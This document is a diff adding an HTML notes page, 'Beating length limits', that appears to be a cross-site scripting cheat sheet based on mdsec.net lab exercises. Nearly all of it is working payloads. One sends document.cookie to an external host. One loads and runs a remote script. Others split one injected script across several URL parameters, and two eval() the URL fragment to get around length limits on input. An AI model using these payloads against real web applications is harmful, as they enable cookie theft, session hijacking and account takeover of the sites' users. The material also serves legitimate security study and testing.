@@ -1,0 +1,29 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Beating length limits</title>
+</head><body><b>Script packer</b><br/>
+<tt><br/>
+</tt><tt>http://dean.edwards.name/packer/</tt><br/>
+<br/>
+<b>Transmit the user’s cookies to the server with hostname a</b><br/>
+<tt><br/>
+</tt><tt>open(&quot;//a/&quot;+document.cookie)</tt><br/>
+<br/>
+<b>Load and executes a script from the server with hostname a</b><br/>
+<tt><br/>
+&lt;script src=http://a&gt;&lt;/script&gt;<br/>
+<br/>
+</tt><b>span an attack payload across multiple different locations</b><br/>
+<tt><br/>
+https://myapp.com/account.php?page_id=”&gt;&lt;script&gt;/*&amp;seed=*/alert(document .cookie);/*&amp;mode=*/&lt;/script&gt;<br/>
+... returns as<br/>
+&lt;input type=”hidden” name=”page_id” value=””&gt;&lt;script&gt;/*”&gt;<br/>
+&lt;input type=”hidden” name=”seed” value=”*/alert(document.cookie);/*”&gt;<br/>
+&lt;input type=”hidden” name=”mode” value=”*/&lt;/script&gt;”&gt;<br/>
+<br/>
+</tt><b>Evaluate the fragment string in the current URL</b><br/>
+<tt><br/>
+http://mdsec.net/error/5/Error.ashx?message=&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert('long script here ......')<br/>
+http://mdsec.net/error/5/Error.ashx?message=&lt;script&gt;eval(unescape(location)) &lt;/script&gt;#%0Aalert(‘long script here ......’)<br/>
+</tt></body></html>
